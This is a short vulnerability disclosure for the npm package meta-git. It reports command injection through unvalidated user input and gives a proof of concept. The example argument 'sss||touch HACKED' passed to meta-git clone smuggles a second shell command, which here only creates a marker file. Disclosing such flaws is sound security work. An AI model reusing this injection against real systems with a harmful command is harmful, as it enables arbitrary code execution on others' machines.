# :bug: Description

The `meta-git` module is vulnerable against `command injection` since the `user-supplied inputs` are concatenated with a command which is executed without validation.

# :fire: POC

1. Create a new directory and insert some test files:

```bash
mkdir tests
cd tests
touch test
touch secret
touch files
```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
npm i meta-git -g # Install affected module
meta-git clone 'sss||touch HACKED' # *HACKED* file is created
```
4. Recheck the files: now `HACKED` has been created
